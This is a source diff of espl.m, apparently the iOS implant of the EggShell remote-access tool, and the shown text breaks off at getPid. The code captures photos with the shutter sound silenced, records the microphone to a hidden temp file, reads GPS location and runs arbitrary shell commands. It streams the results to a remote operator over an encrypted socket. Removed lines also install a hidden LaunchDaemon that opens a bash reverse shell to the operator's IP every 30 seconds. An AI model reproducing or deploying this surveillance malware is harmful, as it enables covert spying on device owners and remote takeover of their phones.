@@ -1,485 +1,96 @@
-#import "espl.h"
-CFArrayRef SBSCopyApplicationDisplayIdentifiers(bool onlyActive, bool debuggable);
+//
+//  espl.m
+//  esplmacos
+//
+//  Created by Lucas Jackson on 8/7/17.
+//  Copyright © 2017 neoneggplant. All rights reserved.
+//
+
+#include "espl.h"
 
 @implementation espl
-    
-@synthesize recorder;
 
-BOOL systaskrunning = false;
+@synthesize fileManager;
+NSPipe *stdinPipe;
+bool sysTaskRunning = false;
 
 -(id)init {
     _thisUIDevice = [UIDevice currentDevice];
     [_thisUIDevice setBatteryMonitoringEnabled:YES];
-    _fileManager = [[NSFileManager alloc] init];
+    fileManager = [[NSFileManager alloc] init];
+    [fileManager changeCurrentDirectoryPath:NSHomeDirectory()];
     _messagingCenter = [CPDistributedMessagingCenter centerNamed:@"com.sysserver"];
     return self;
 }
 
-//MARK: Socketry
 
-int sockfd;
-
--(int)connect:(NSString*)host :(long)port {
-    socklen_t len;
-    struct sockaddr_in address;
-    int result;
-    
-    sockfd = socket (AF_INET, SOCK_STREAM, 0);
-    address.sin_family = AF_INET;
-    address.sin_addr.s_addr = inet_addr ([host UTF8String]);
-    address.sin_port = htons (port);
-    len = sizeof (address);
-    result = connect (sockfd, (struct sockaddr *) &address, len);
-    
-    return result;
-}
-
--(void)receiveFileData:(NSString *)saveToPath :(long)fileSize {
-    [self blank];
-    long bsize = 1024;
-    char buffer[bsize];
-    NSMutableData *data = [NSMutableData alloc];
-    //we use both chunks to make sure we never check an incomplete terminator string
-    NSString *lastchunk = @"";
-    NSString *thischunk = @"";
-    while(read (sockfd, &buffer, sizeof(buffer))) {
-        //append data
-        thischunk = [NSString stringWithFormat:@"%s",buffer];
-        [data appendBytes:buffer length:sizeof(buffer)];
-        //detect terminator, decrypt data, write to file
-        if (!([[NSString stringWithFormat:@"%@%@",lastchunk,thischunk] rangeOfString:_terminator].location == NSNotFound)) {
-            //base64 decode file data
-            data = [[NSMutableData alloc] initWithBase64EncodedData:
-                    [data subdataWithRange:NSMakeRange(0, fileSize)] options:0];
-            //decrypt nsdata and write to file
-            [[escryptor decryptNSData:_skey :data] writeToFile:saveToPath atomically:true];
-            break;
+-(NSDictionary *)getDirectoryContents:(NSString *)path {
+    NSMutableDictionary *results = [[NSMutableDictionary alloc] init];
+    const char * searchDir= [path UTF8String];
+    DIR *dp;
+    struct dirent *ep;
+    dp = opendir(searchDir);
+    if (dp != NULL) {
+        while ((ep = readdir(dp))) {
+            [results setValue:[NSNumber numberWithUnsignedInteger:ep->d_type] forKey:[NSString stringWithFormat:@"%s",ep->d_name]];
         }
-        lastchunk = [NSString stringWithFormat:@"%s",buffer];
-        memset(buffer,'\0',sizeof(buffer));
+    } else {
+        return nil;
     }
-    [self blank];
+    return results;
 }
 
--(void)sendFileData:(NSData*)fileData {
-    NSData *encryptedData = [escryptor encryptNSData:self.skey :fileData];
-    [self sendString:[NSString stringWithFormat:@"%lu",(unsigned long)encryptedData.length]];
-    write (sockfd, [encryptedData bytes], encryptedData.length);
-    write (sockfd, [_terminator UTF8String], _terminator.length);
-}
 
--(void)sendString:(NSString *)string {
-    string = [string stringByReplacingOccurrencesOfString:@"’" withString:@"'"];
-    NSString *finalstr = [NSString stringWithFormat:@"%@%@",[escryptor encryptNSStringToB64:self.skey :string],_terminator];
-    write (sockfd, [finalstr UTF8String], finalstr.length);
-}
-
--(void)liveSendString:(NSString *)string {
-    NSMutableString *reversed = [NSMutableString string];
-    NSInteger charIndex = [_terminator length];
-    while (charIndex > 0) {
-        charIndex--;
-        NSRange subRange = NSMakeRange(charIndex, 1);
-        [reversed appendString:[_terminator substringWithRange:subRange]];
-    }
-    
-    NSString *finalstr = [NSString stringWithFormat:@"%@%@",
-                          [escryptor encryptNSStringToB64:self.skey :string],reversed];
-    write (sockfd, [finalstr UTF8String], finalstr.length);
-}
-
-//MARK: Convenience
-
--(void)blank {
-    [self sendString:@""]; //bang
-}
-
--(NSString *)forgetFirst:(NSArray *)args {
-    int x = 1;
-    NSString *path = @"";
-    for (NSString *tpath in args) {
-        if (x != 1) {
-            path = [NSString stringWithFormat:@"%@%@ ",path,tpath];
-        }
-        x++;
-    }
-    return [path substringToIndex:[path length] - 1];
-}
-
-//MARK: Camera
-
--(NSData*)camera:(BOOL)isfront {
-    NSDictionary *userInfo = [NSDictionary dictionaryWithObject:@"silenceShutter" forKey:@"cmd"];
-    [_messagingCenter sendMessageName:@"commandWithNoReply" userInfo:userInfo];
-    [self setupCaptureSession:isfront];
-    [NSThread sleepForTimeInterval:0.2];
-    //this guy deserves a medal
-    //http://stackoverflow.com/questions/22549020/capture-a-still-image-on-ios7-through-a-console-app
-    __block BOOL done = NO;
-    __block NSData *pictureData;
-    [self captureWithBlock:^(NSData *imageData) {
-        done = YES;
-        pictureData = imageData;
-    }];
-    while (!done)
-    [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.1]];
-    return pictureData;
-}
-
--(AVCaptureDevice *)frontFacingCameraIfAvailable
-{
-    NSArray *videoDevices = [AVCaptureDevice devicesWithMediaType:AVMediaTypeVideo];
-    AVCaptureDevice *captureDevice = nil;
-    for (AVCaptureDevice *device in videoDevices){
-        if (device.position == AVCaptureDevicePositionFront){
-            captureDevice = device;
-            break;
-        }
-    }
-    return captureDevice;
-}
-
--(AVCaptureDevice *)backFacingCameraIfAvailable
-{
-    NSArray *videoDevices = [AVCaptureDevice devicesWithMediaType:AVMediaTypeVideo];
-    AVCaptureDevice *captureDevice = nil;
-    for (AVCaptureDevice *device in videoDevices){
-        if (device.position == AVCaptureDevicePositionBack){
-            captureDevice = device;
-            break;
-        }
-    }
-    return captureDevice;
-}
-
-- (void)setupCaptureSession:(BOOL)isfront{
-    self.session = [[AVCaptureSession alloc] init];
-    self.session.sessionPreset = AVCaptureSessionPresetMedium;
-    
-    AVCaptureDevice *device = nil;
-    NSError *error = nil;
-    if (isfront)
-        device = [self frontFacingCameraIfAvailable];
-    else
-        device = [self backFacingCameraIfAvailable];
-    
-    AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:device error:&error];
-    [self.session addInput:input];
-    self.stillImageOutput = [[AVCaptureStillImageOutput alloc] init];
-    NSDictionary *outputSettings = [[NSDictionary alloc] initWithObjectsAndKeys: AVVideoCodecJPEG, AVVideoCodecKey, nil];
-    [self.stillImageOutput setOutputSettings:outputSettings];
-    [outputSettings release];
-    [self.session addOutput:self.stillImageOutput];
-    [self.session startRunning];
-}
-
-- (void)captureWithBlock:(void(^)(NSData* imageData))block
-{
-    AVCaptureConnection* videoConnection = nil;
-    for (AVCaptureConnection* connection in self.stillImageOutput.connections)
-    {
-        for (AVCaptureInputPort* port in [connection inputPorts])
-        {
-            if ([[port mediaType] isEqual:AVMediaTypeVideo])
-            {
-                videoConnection = connection;
-                break;
-            }
-        }
-        if (videoConnection)
-            break;
-    }
-    [self.stillImageOutput captureStillImageAsynchronouslyFromConnection:videoConnection completionHandler: ^(CMSampleBufferRef imageSampleBuffer, NSError *error)
-     {
-         NSData* imageData = [AVCaptureStillImageOutput jpegStillImageNSDataRepresentation:imageSampleBuffer];
-         block(imageData);
-     }];
-    [_stillImageOutput release];
-    [_session release];
-}
-
-//MARK: Mic
-
--(void)mic:(NSString *)arg {
-    NSString *usage = @"Usage: mic record|stop";
-    if ([arg isEqualToString:@""]) {
-        [self sendString:usage];
-        return;
-    }
-    if ([arg isEqual:@"record"]) {
-        NSString *file = @"/tmp/.avatmp";
-        [_fileManager removeItemAtPath:file error:NULL];
-        [[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryRecord withOptions:AVAudioSessionCategoryOptionMixWithOthers error:nil];
-        
-        NSString *destinationString = file;
-        NSURL *destinationURL = [NSURL fileURLWithPath: destinationString];
-        NSDictionary *mysettings = @{AVFormatIDKey: @(kAudioFormatMPEG4AAC),
-                                     AVEncoderAudioQualityKey: @(AVAudioQualityHigh),
-                                     AVNumberOfChannelsKey: @1,
-                                     AVSampleRateKey: @22050.0f};
-        [[AVAudioSession sharedInstance] setActive:YES error:nil];
-        recorder = [[AVAudioRecorder alloc] initWithURL:destinationURL settings:mysettings error:nil];
-        recorder.meteringEnabled = true;
-        recorder.delegate = self;
-        
-        [recorder prepareToRecord];
-        [recorder record];
-        [self sendString:@"Listening..."];
-    }
-    else if ([arg isEqualToString:@"stop"]) {
-        if ([recorder isRecording]) {
-            [recorder stop];
-            [self sendString:@"1"];
-        }
-        else {
-            [self sendString:@"Not currently recording"];
-        }
-    }
-    else {
-        [self sendString:usage];
-    }
-}
-
-//MARK: File Management
-
--(void)directoryList:(NSString *)arg {
-    //basically "ls"
-    NSArray *files;
-    NSString *dir = [_fileManager currentDirectoryPath];
-    if (![arg isEqualToString:@""]) {
-        dir = arg;
-    }
-    
-    NSError *error = nil;
-    files = [_fileManager contentsOfDirectoryAtPath:dir error:&error];
-    if (error != nil) {
-        [self sendString:[NSString stringWithFormat:@"%@",error]];
-        return;
-    }
-    
-    NSString *result = @"";
-    for (NSString *f in files) {
-        result = [result stringByAppendingString:[NSString stringWithFormat:@"%@\n",f]];
-    }
-    if ([result length] > 0) {
-        result = [result substringToIndex:[result length] - 1];
-    }
-    [self sendString:result];
-}
-
--(void)rmFile:(NSString *)arg {
-    NSString *file = @"";
-    if (![arg isEqualToString:@""]) {
-        file = arg;
-    }
-    else {
-        [self sendString:@"Usage: rm filename"];
-        return;
-    }
+-(void)listDirectory:(NSString *)path {
     BOOL isdir = false;
-    if ([_fileManager fileExistsAtPath:file isDirectory:&isdir]) {
+    if ([fileManager fileExistsAtPath:path isDirectory:&isdir]) {
         if (isdir) {
-            [self sendString:[NSString stringWithFormat:@"%@: is a directory",file]];
+            NSDictionary *results = [self getDirectoryContents:path];
+            NSData *jsonData = [NSJSONSerialization dataWithJSONObject:results options:0 error:nil];
+            [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
+        } else {
+            [self sendString:[NSString stringWithFormat:@"%@: is a file",path]];
         }
-        else {
-            [_fileManager removeItemAtPath:file error:NULL];
-            [self blank];
-        }
+    } else {
+        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",path]];
     }
-    else {
-        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",file]];
-    }
+    [self term];
 }
 
--(void)changeWD:(NSString *)arg {
-    //basically "cd"
-    NSString *dir = NSHomeDirectory();
-    if (![arg isEqualToString:@""]) {
-        dir = arg;
-    }
-    BOOL isdir = false;
-    if ([_fileManager fileExistsAtPath:dir isDirectory:&isdir]) {
-        if (isdir) {
-            [_fileManager changeCurrentDirectoryPath:dir];
-            NSString *blank = @"";
-            [self sendString:[NSString stringWithFormat:blank,dir]];
-        }
-        else {
-            [self sendString:[NSString stringWithFormat:@"%@: Not a directory",dir]];
-        }
-    }
-    else {
-        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",dir]];
-    }
+
+-(void)tabComplete:(NSString *)path {
+    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:[self getDirectoryContents:path] options:0 error:nil];
+    [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
+    [self term];
 }
 
--(void)sendEncryptedFile:(NSData *)fileData {
-    NSString *writeToFileName = @"/tmp/.tmpenc";
-    fileData = [fileData AES256EncryptWithKey:_skey];
-    [fileData writeToFile:writeToFileName atomically:true];
-    
-    char bufferin[256];
-    FILE *fp;
-    fp = fopen([writeToFileName UTF8String], "r");
-    /*
-     stream file to socket
-     some padding will exist but only at the end of the file
-     we can handle this server side by removing the offset
-     */
-    while (!feof(fp))
-    {
-        unsigned long nRead = fread(bufferin, sizeof(char), 256, fp);
-        if (nRead <= 0)
-        printf("ERROR reading file\n");
-        
-        char *pBuf = bufferin;
-        while (nRead > 0)
-        {
-            long nSent = send(sockfd, pBuf, nRead, 0);
-            
-            if (nSent == -1)
-            {
-                fd_set writefd;
-                FD_ZERO(&writefd);
-                FD_SET(sockfd, &writefd);
-                
-                if (select(0, NULL, &writefd, NULL, NULL) != 1)
-                printf("ERROR waiting to write to socket\n");
-                continue;
-            }
-            
-            if (nSent == 0)
-            printf("DISCONNECTED writing to socket\n");
-            
-            pBuf += nSent;
-            nRead -= nSent;
-        }
-    }
-    //our end send file command
-    write(sockfd, [_terminator UTF8String], _terminator.length);
-}
 
--(NSData*)filePathToData:(NSString *)arg {
-    BOOL isdir;
-    if ([_fileManager fileExistsAtPath:arg isDirectory:&isdir]) {
-        if (isdir) {
-            [self sendString:[NSString stringWithFormat:@"%@ is a directory",arg]];
-        }
-        else {
-            return [_fileManager contentsAtPath:arg];
-        }
-    }
-    else {
-        [self sendString:[NSString stringWithFormat:@"%@ not found",arg]];
-    }
-    return NULL;
-}
+-(void)showAlert:(NSString *)args {
+    NSData *jsonData = [args dataUsingEncoding:NSUTF8StringEncoding];
+    NSMutableDictionary *uploadargs = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:NULL];
+    const char *title = [[NSString stringWithFormat:@"%@",[uploadargs valueForKey:@"title"]] UTF8String];
+    const char *message = [[NSString stringWithFormat:@"%@",[uploadargs valueForKey:@"message"]] UTF8String];
 
-//MARK: Misc
-
--(void)locate {
-    CLLocationManager* manager = [[CLLocationManager alloc] init];
-//    manager.delegate = self;
-    [manager startUpdatingLocation];
-    
-    CLLocation *location = [manager location];
-    CLLocationCoordinate2D coordinate = [location coordinate];
-    NSString *latitude = [NSString stringWithFormat:@"%f", coordinate.latitude];
-    NSString *longitude = [NSString stringWithFormat:@"%f", coordinate.longitude];
-    NSString *result = [NSString stringWithFormat:@"Latitude : %@\nLongitude : %@\nhttp://maps.google.com/maps?q=%@,%@",latitude,longitude,latitude,longitude];
-    if ((int)(coordinate.latitude + coordinate.longitude) == 0) {
-        result = @"Unable to get Coordinates\nAre location services enabled?";
-    }
-    [manager release];
-    [self sendString:result];
-}
-
--(void)eslog:(NSString *)str {
-    #pragma GCC diagnostic push
-    #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
-    system([[NSString stringWithFormat:@"echo '%@' >> /tmp/esplog",str] UTF8String]);
-    #pragma GCC diagnostic pop
-}
-
--(void)exec:(NSString *)command {
-    #pragma GCC diagnostic push
-    #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
-    system([command UTF8String]);
-    #pragma GCC diagnostic pop
-}
-
--(void)vibrate {
-    AudioServicesPlayAlertSound(kSystemSoundID_Vibrate);
-    [self blank];
-}
-
--(void)sysinfo {
-    uint64_t totalSpace = 0;
-    uint64_t totalFreeSpace = 0;
-    NSError *error = nil;
-    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
-    NSDictionary *dictionary = [[NSFileManager defaultManager] attributesOfFileSystemForPath:[paths lastObject] error: &error];
-    
-    if (dictionary) {
-        NSNumber *fileSystemSizeInBytes = [dictionary objectForKey: NSFileSystemSize];
-        NSNumber *freeFileSystemSizeInBytes = [dictionary objectForKey:NSFileSystemFreeSize];
-        totalSpace = [fileSystemSizeInBytes unsignedLongLongValue];
-        totalFreeSpace = [freeFileSystemSizeInBytes unsignedLongLongValue];
-    }
-
-    NSString *info = [NSString stringWithFormat:@"Model: %@\nSystem Version: %@ %@\nDevice Name: %@\nUUID: %@\n%@",
-                      [_thisUIDevice model],
-                      [_thisUIDevice systemName],[_thisUIDevice systemVersion],
-                      [_thisUIDevice name],
-                      [_thisUIDevice identifierForVendor],
-                      [self battery]];
-    [self sendString:info];
-}
-
--(void)say:(NSString *)string {
-    AVSpeechUtterance *utterance = [AVSpeechUtterance speechUtteranceWithString:string];
-    utterance.rate = 0.4;
-    AVSpeechSynthesizer *syn = [[[AVSpeechSynthesizer alloc] init]autorelease];
-    [syn speakUtterance:utterance];
-    [self blank];
-}
-
--(void)displayalert:(const char *)title :(const char *)message {
     extern char *optarg;
     extern int optind;
+
     CFTimeInterval timeout = 0;
     CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
     CFDictionaryAddValue( dict, kCFUserNotificationAlertHeaderKey, CFStringCreateWithCString(NULL, title, kCFStringEncodingUTF8) );
     CFDictionaryAddValue( dict, kCFUserNotificationAlertMessageKey, CFStringCreateWithCString(NULL, message, kCFStringEncodingUTF8) );
+    //CFDictionaryAddValue( dict, kCFUserNotificationIconURLKey, CFURLCreateWithString(NULL, CFSTR("/var/mobile/test.png"), NULL) );
     SInt32 error;
     CFOptionFlags flags = 0;
     flags |= kCFUserNotificationPlainAlertLevel;
     CFDictionaryAddValue( dict, kCFUserNotificationAlertTopMostKey, kCFBooleanTrue );
     CFNotificationCenterPostNotificationWithOptions( CFNotificationCenterGetDarwinNotifyCenter(), CFSTR("test"),  NULL, NULL, kCFNotificationDeliverImmediately );
-    CFUserNotificationRef notif = CFUserNotificationCreate( NULL, timeout, flags, &error, dict );
-    CFOptionFlags options;
-    CFUserNotificationReceiveResponse( notif, 0, &options );
-    CFUserNotificationGetResponseDictionary(notif);
+    CFUserNotificationCreate( NULL, timeout, flags, &error, dict );
+    //CFOptionFlags options;
+    //CFUserNotificationReceiveResponse( notif, 0, &options );
+    //CFUserNotificationGetResponseDictionary(notif);
+    [self term];
 }
 
--(void)alert:(NSArray *)args {
-    //our arguments were encoded in base64 so we can have multiple words in multiple arguments
-    NSData *titledata = [[NSData alloc] initWithBase64EncodedString:[NSString stringWithFormat:@"%@" , args[0]] options:0];
-    NSString *titlestring = [[NSString alloc] initWithData:titledata encoding:NSUTF8StringEncoding];
-    NSData *messagedata = [[NSData alloc] initWithBase64EncodedString:[NSString stringWithFormat:@"%@" , args[1]] options:0];
-    NSString *messagestring = [[NSString alloc] initWithData:messagedata encoding:NSUTF8StringEncoding];
-    //run in background! cool
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-        [self displayalert:[titlestring UTF8String]:[messagestring UTF8String]];
-    });
-    [self sendString:@""];
-}
-
--(void)getPid {
-    NSProcessInfo *processInfo = [NSProcessInfo processInfo];
-    int processID = [processInfo processIdentifier];
-    [self sendString:[NSString stringWithFormat:@"%d",processID]];
-}
 
 -(void)openURL:(NSString *)arg {
     if (![arg isEqualToString:@""]) {
@@ -492,236 +103,597 @@ int sockfd;
             if (!ret) {
                 [self sendString:[NSString stringWithFormat:@"Error opening url %@",arg]];
             }
-            else {
-                [self blank];
+        }
+    }
+    [self term];
+}
+
+//MARK: Picture Data
+-(void)takePicture:(bool)front {    
+    NSArray *devices = [AVCaptureDevice devicesWithMediaType:AVMediaTypeVideo];
+    AVCaptureDevice *captureDevice = nil;
+
+    for (AVCaptureDevice *device in devices) {
+        if (front) {
+            if (device.position == AVCaptureDevicePositionFront) {
+                captureDevice = device;
+                [self debugLog:[NSString stringWithFormat:@"weeeee got front"]];
+            }
+        } else {
+            if (device.position == AVCaptureDevicePositionBack) {
+                captureDevice = device;
+                [self debugLog:[NSString stringWithFormat:@"weeeee got back"]];
             }
         }
     }
-    else {
-        [self sendString:@"Usage example: openurl http://google.com"];
-    }
-}
-    
--(void)dial:(NSString *)arg {
-    if (![arg isEqualToString:@""]) {
-        [self openURL:[NSString stringWithFormat:@"tel://%@",arg]];
-    }
-    else {
-        [self sendString:@"Usage example: dial 5553334444"];
-    }
-}
-
--(void)setVolume:(NSString *)arg {
-    //TODO: update
-    if (![arg isEqualToString:@""]) {
-        #pragma GCC diagnostic push
-        #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
-        [[MPMusicPlayerController applicationMusicPlayer]setVolume:[arg floatValue]];
-        #pragma GCC diagnostic pop
-        [self blank];
-    }
-    else {
-        [self sendString:@"Usage example: volume 0.1"];
-    }
-}
-
--(void)getVolume {
-    #pragma GCC diagnostic push
-    #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
-    [self sendString:[NSString stringWithFormat:@"%.2f",[[MPMusicPlayerController applicationMusicPlayer]volume]]];
-    #pragma GCC diagnostic pop
-}
-
--(void)isplaying {
-    #pragma GCC diagnostic push
-    #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
-    float currentpbt = [[MPMusicPlayerController iPodMusicPlayer] currentPlaybackTime];
-    [NSThread sleepForTimeInterval:0.1];
-    float newcurrentpbt = [[MPMusicPlayerController iPodMusicPlayer] currentPlaybackTime];
-    if (currentpbt != newcurrentpbt) {
-        [NSThread sleepForTimeInterval:0.1];
-        MPMediaItem * song = [[MPMusicPlayerController iPodMusicPlayer] nowPlayingItem];
-        NSString * title   = [song valueForProperty:MPMediaItemPropertyTitle];
-        NSString * album   = [song valueForProperty:MPMediaItemPropertyAlbumTitle];
-        NSString * artist  = [song valueForProperty:MPMediaItemPropertyArtist];
-        NSString *mpstatus = [NSString stringWithFormat:@"Currently Playing\nTitle: %@\nAlbum: %@\nArtist: %@\nPlayback time: %f",title,album,artist,newcurrentpbt];
-        [self sendString:mpstatus];
-    }
-    else {
-        [self sendString:@"Not Playing"];
-    }
-    #pragma GCC diagnostic pop
-}
-
-
--(void)listapps {
-    NSString *apps = @"";
-    CFArrayRef ary = SBSCopyApplicationDisplayIdentifiers(false, false);
-    if (ary != NULL) {
-        for(CFIndex i = 0; i < CFArrayGetCount(ary); i++) {
-            if (CFArrayGetValueAtIndex(ary, i)) {
-                apps = [NSString stringWithFormat:@"%@%@\n",apps,CFArrayGetValueAtIndex(ary, i)];
-            }
-        }
-        [self sendString:apps];
-    }
-    else {
-        [self sendString:@"could not SBSCopyApplicationDisplayIdentifiers"];
-    }
-}
-
--(NSString *)battery {
-    int batinfo=([_thisUIDevice batteryLevel]*100);
-    return [NSString stringWithFormat:@"Battery Level: %d ",batinfo];
-}
-
--(void)launchApp:(NSString *)arg {
-    if (![arg isEqualToString:@""]) {
-        int ret;
-        CFStringRef identifier = CFStringCreateWithCString(kCFAllocatorDefault, [arg UTF8String], kCFStringEncodingUTF8);
-        assert(identifier != NULL);
-        
-        ret = SBSLaunchApplicationWithIdentifier(identifier, FALSE);
-        
-        if (ret != 0) {
-            [self sendString:@"Cannot open app, is device locked?"];
-            return;
-        }
-        
-        CFRelease(identifier);
-        [self blank];
-    }
-    else {
-        [self sendString:@"Usage: open BundleIdentifier"];
-    }
-}
-
--(void)runtask:(NSString *)cmd {
-    if ([cmd  isEqual: @"endtask"] && systaskrunning) {
-        [_systask terminate];
+    if (captureDevice == nil) {
+        [self sendString:@"{\"error\":\"Unable to activate camera\"}"];
+        [self term];
         return;
     }
-    //http://stackoverflow.com/questions/23937690/getting-process-output-using-nstask-on-the-go
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-        systaskrunning = true;
-        _systask = [[NSTask alloc] init];
-        [_systask setLaunchPath:@"/bin/bash"];
-        [_systask setArguments:@[ @"-c", cmd]];
-        [_systask setCurrentDirectoryPath:[_fileManager currentDirectoryPath]];
-        
-        NSPipe *stdoutPipe = [NSPipe pipe];
-        [_systask setStandardOutput:stdoutPipe];
-        [_systask setStandardError:stdoutPipe];
-        
-        NSFileHandle *stdoutHandle = [stdoutPipe fileHandleForReading];
-        [stdoutHandle waitForDataInBackgroundAndNotify];
-        id observer = [[NSNotificationCenter defaultCenter] addObserverForName:NSFileHandleDataAvailableNotification
-                                                                        object:stdoutHandle queue:nil
-                                                                    usingBlock:^(NSNotification *note)
-                       {
-                           NSData *dataRead = [stdoutHandle availableData];
-                           NSString *newOutput = [[NSString alloc] initWithData:dataRead encoding:NSUTF8StringEncoding];
-                           [self liveSendString:newOutput];
-                           [stdoutHandle waitForDataInBackgroundAndNotify];
-                       }];
-        [_systask launch];
-        [_systask waitUntilExit];
-        [[NSNotificationCenter defaultCenter] removeObserver:observer];
-        systaskrunning = false;
-        [self blank];
-    });
+
+    //initialize session
+    self.session = [[AVCaptureSession alloc] init];
+    self.session.sessionPreset = AVCaptureSessionPresetMedium;
+    //set input
+    NSError *error = nil;
+    AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:captureDevice error:&error];
+    [self.session addInput:input];
+    //set output
+    [self debugLog:[NSString stringWithFormat:@"setting still image output"]];
+    [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.5]];
+    self.stillImageOutput = [[AVCaptureStillImageOutput alloc] init];
+    
+    NSDictionary *outputSettings = [[NSDictionary alloc] initWithObjectsAndKeys: AVVideoCodecJPEG, AVVideoCodecKey, nil];
+    [self.stillImageOutput setOutputSettings:outputSettings];
+    [self.session addOutput:self.stillImageOutput];
+    //run
+    [self.session startRunning];
+
+    //take pic
+    [NSThread sleepForTimeInterval:0.2];
+    __block BOOL done = NO;
+    __block NSData *bImageData;
+    [self captureImageWithBlock:^(NSData *imageData)
+     {
+         if (imageData) {
+             NSMutableDictionary *result = [[NSMutableDictionary alloc] init];
+             [result setValue:[NSNumber numberWithInt:(int)imageData.length] forKey:@"size"];
+             [result setValue:[NSNumber numberWithInt:1] forKey:@"success"];
+             NSData *jsonData = [NSJSONSerialization dataWithJSONObject:result options:0 error:nil];
+             [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
+             [self term];
+         } else {
+             [self sendString:@"{\"status\":0}"];
+         }
+         bImageData = [[NSData alloc] initWithData:imageData];
+         [self sendData:bImageData];
+         done = true;
+     }];
+    while (!done)
+        [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.1]];
+
+    [self debugLog:[NSString stringWithFormat:@"done"]];
 }
 
 
--(void)persistence:(NSString *)ip :(int)port {
-    NSString *loaderpath = @"/Library/LaunchDaemons/.esploader.plist";
-    if ([_fileManager fileExistsAtPath:loaderpath]) {
-        [self sendString:@"Persistence already installed"];
-    }
-    else {
-        NSString *plist = [NSString stringWithFormat:@"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
-        <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\
-        <plist version=\"1.0\"><dict><key>Label</key>\
-        <string>com.example.touchsomefile</string>\
-        <key>ProgramArguments</key>\
-        <array><string>bash</string><string>-c</string>\
-        <string>bash &gt;&amp; /dev/tcp/%@/%d 0&gt;&amp;1</string>\
-        </array><key>RunAtLoad</key><true/>\
-        <key>StartInterval</key><integer>30</integer>\
-        </dict></plist>",ip,port];
-        [plist writeToFile:@"/Library/LaunchDaemons/.esploader.plist"
-                atomically:true
-                  encoding:NSUTF8StringEncoding
-                     error:nil];
-        [self exec:[NSString stringWithFormat:@"launchctl load %@",loaderpath]];
-        [self sendString:@"Persistence Installed"];
-    }
-}
+-(void)captureImageWithBlock:(void (^)(NSData *))imageData {    
+    AVCaptureConnection* videoConnection = nil;
 
--(void)rmpersistence {
-    NSString *loaderpath = @"/Library/LaunchDaemons/.esploader.plist";
-    if ([_fileManager fileExistsAtPath:loaderpath]) {
-        [self exec:[NSString stringWithFormat:@"launchctl unload %@",loaderpath]];
-        [_fileManager removeItemAtPath:loaderpath error:NULL];
-        [self sendString:@"Persistence removed"];
-    }
-    else {
-        [self sendString:@"Persistence not installed"];
-    }
-}
-
-//MARK: EggShell Pro
-
--(void)upload:(NSString *)uploadpath {
-    @autoreleasepool {
-        long dinc = 0;
-        NSString *filedata = @"";
-        while(1) {
-            char buffer[1024];
-            read(sockfd, &buffer, sizeof(buffer));
-            filedata = [NSString stringWithFormat:@"%@%s",filedata,buffer];
-            dinc += 1024;
-            memset(buffer,'\0',1024);
-            if (strstr([filedata UTF8String],[_terminator UTF8String])) {
-                filedata = [filedata stringByReplacingOccurrencesOfString:_terminator withString:@""];
+    for (AVCaptureConnection* connection in self.stillImageOutput.connections) {
+        [self debugLog:[NSString stringWithFormat:@"scanned"]];
+        [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.5]];
+        for (AVCaptureInputPort* port in [connection inputPorts]) {
+            if ([[port mediaType] isEqual:AVMediaTypeVideo]) {
+                videoConnection = connection;
+                [self debugLog:[NSString stringWithFormat:@"we got the videoConnection!"]];
                 break;
             }
         }
-        NSData *fdata = [[NSData alloc] initWithBase64EncodedString:filedata options:NSDataBase64DecodingIgnoreUnknownCharacters];
-        [fdata writeToFile:uploadpath atomically:true];
+        if (videoConnection)
+            break;
+    }
+    if (videoConnection == nil) {
+        return imageData(nil);
+    }
+    
+    //capture still image from video connection
+    [self.stillImageOutput captureStillImageAsynchronouslyFromConnection:videoConnection completionHandler: ^(CMSampleBufferRef imageSampleBuffer, NSError *error)
+     {
+         dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void) {
+            [self.session stopRunning];
+         });
+         
+         if (error)
+             imageData(nil);
+         
+         NSData* data = [AVCaptureStillImageOutput jpegStillImageNSDataRepresentation:imageSampleBuffer];
+         if (data) {
+             imageData(data);
+         } else {
+             imageData(nil);
+         }
+     }];
+}
+
+
+-(void)locate {
+    CLLocationManager* manager = [[CLLocationManager alloc] init];
+    [manager startUpdatingLocation];
+    CLLocation *location = [manager location];
+    CLLocationCoordinate2D coordinate = [location coordinate];
+    NSString *result = [NSString stringWithFormat:@"Latitude : %f\nLongitude : %f\nhttp://maps.google.com/maps?q=%f,%f",
+        coordinate.latitude,
+        coordinate.longitude,
+        coordinate.latitude,
+        coordinate.longitude];
+    if ((int)(coordinate.latitude + coordinate.longitude) == 0) {
+        result = @"Unable to get Coordinates\nAre location services enabled?";
+    }
+    [manager release];
+    [self sendString:result];
+    [self term];
+}
+
+
+-(void)getPid {
